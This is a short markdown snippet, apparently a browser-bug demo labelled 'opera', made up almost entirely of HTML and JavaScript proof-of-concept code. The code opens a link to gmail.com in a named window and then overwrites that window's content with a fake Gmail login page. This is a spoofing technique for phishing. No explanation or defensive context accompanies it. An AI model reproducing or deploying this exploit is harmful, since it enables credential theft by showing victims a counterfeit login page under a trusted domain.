## opera

### demo
``` html
<a href="http://www.gmail.com:443" target="aa" onclick="setTimeout('fake()',100)"><h1>click me</h1></a>
<script>
function fake() {
var t = window.open('javascript:alert(document.domain)','aa');
t.document.body.innerHTML = '<title>Gmail</title><H1>Fake Lgin Page HERE</H1>';
}
</script>
```

---
